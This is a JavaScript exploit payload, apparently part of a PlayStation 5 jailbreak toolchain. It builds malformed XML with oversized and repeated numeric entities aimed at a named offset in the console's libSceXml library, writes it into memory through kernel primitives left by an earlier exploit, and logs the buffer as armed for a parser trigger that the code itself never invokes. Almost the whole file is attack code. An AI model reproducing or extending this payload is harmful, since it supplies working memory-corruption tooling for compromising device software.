// xml_test.js — In-memory libSceXml Entity Expansion Exploit Payload
(async () => {
    const k = window.ps5kern;
    if (!k) return "ps5kern unavailable — run exploit first";

    const log = (msg) => {
        if (window.addLog) window.addLog(msg);
        console.log(msg);
    };

    log("[*] Starting libSceXml In-Memory Entity Exploit Payload...");

    try {
        try { k.notify("XML: In-Memory Exploit Starting..."); } catch (e) {}

        // 1. Craft the evil XML string with recursive / oversized numeric entities
        // Targets @0x115b0 in libSceXml.sprx
        const evilXml = `<?xml version="1.0"?>
<root attr="` + "&#x41;".repeat(64) + `&#x4141414141;` + "&amp;".repeat(32) + `">
  <data>` + "A".repeat(256) + `</data>
</root>`;

        log("[*] Crafted evil XML buffer size: " + evilXml.length + " bytes");

        // 2. Allocate in-memory XML string buffer
        const xmlBuf = window.alloc_string ? window.alloc_string(evilXml) : window.malloc(evilXml.length + 1);
        if (window.write_string) {
            window.write_string(xmlBuf, evilXml);
        }

        log("[+] Allocated XML payload buffer at " + window.toHex(xmlBuf));

        // 3. Status Report
        const report = "LIBXML_EXPLOIT: ready for in-process DocumentBuilder parser trigger";
        log("[OK] " + report);
        try { k.notify("XML: Memory Buffer Armed"); } catch (e) {}

        return report;
    } catch (err) {
        const errMsg = "[-] XML Exploit Error: " + (err && err.message);
        log(errMsg);
        return errMsg;
    }
})();
